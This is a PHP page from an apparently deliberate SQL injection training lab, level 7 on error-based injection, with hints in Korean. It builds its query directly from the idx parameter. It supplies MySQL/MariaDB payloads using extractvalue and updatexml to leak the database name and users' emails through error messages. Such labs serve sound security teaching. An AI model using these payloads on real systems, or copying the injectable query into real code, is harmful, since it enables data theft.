<?php require __DIR__.'/_lib.php'; page_header('Level 7 — Error-based');
$db=ladder_db(); $idx=$_GET['idx']??"1 and extractvalue(1,concat(0x7e,(select database())))"; $mode=$_GET['mode']??'raw';
$sql="select * from freeboard where idx={$idx}";
$result=lab_query($db,$sql,__FILE__,__LINE__,['level'=>'7','note'=>'error-based ('.$mode.')']);
$err=($result===false)?mysqli_error($db):null; ?>
<h1>Level 7 — Error-based <span class="pill"><?=h($mode)?></span></h1>
<div class="box goal"><b>목표</b>: 에러 메시지에 데이터를 실어 노출. Error-based 는 Blind 가 아니다(오류가 곧 채널).<br>
힌트(MariaDB): <code>1 and extractvalue(1,concat(0x7e,(select database())))</code>,
<code>1 and updatexml(1,concat(0x7e,(select group_concat(email) from users)),1)</code></div>
<div class="box warn"><b>DBMS 호환성</b>: <code>extractvalue/updatexml</code> 는 MySQL/MariaDB 계열 함수이며 버전에 따라 메시지 포맷이 다를 수 있다. 다른 DBMS(PostgreSQL 등)에서는 동작하지 않는다.</div>
<div class="box"><form method="GET">idx = <input name="idx" value="<?=h($idx)?>" size="80">
 <select name="mode"><option value="raw"<?=$mode==='raw'?' selected':''?>>raw(원본 오류 노출)</option><option value="std"<?=$mode==='std'?' selected':''?>>std(표준화)</option></select>
 <button>실행</button></form></div>
<?php show_sql($sql);
if($mode==='std'){ if($err) echo '<div class="err">요청을 처리할 수 없습니다. (오류 상세는 표준화되어 숨김)</div>'; else show_result($result); }
else { show_error($err); if(!$err) show_result($result); }
page_footer(); ?>
